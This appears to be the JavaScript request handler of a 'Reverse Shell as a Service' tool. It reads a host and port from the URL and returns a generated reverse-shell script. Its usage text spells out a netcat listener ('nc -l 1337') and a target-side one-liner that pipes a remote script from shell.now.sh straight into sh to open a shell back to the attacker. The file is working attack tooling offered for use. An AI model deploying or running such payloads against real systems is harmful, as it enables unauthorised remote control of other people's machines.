'use strict';

const utils = require('./utils');

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://shell.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const reverseShell = req => {
	const [host, port] = req.url.substr(1).split(':');
	return (host && port) ? utils.generateScript(host, port) : usage;
};

module.exports = reverseShell;
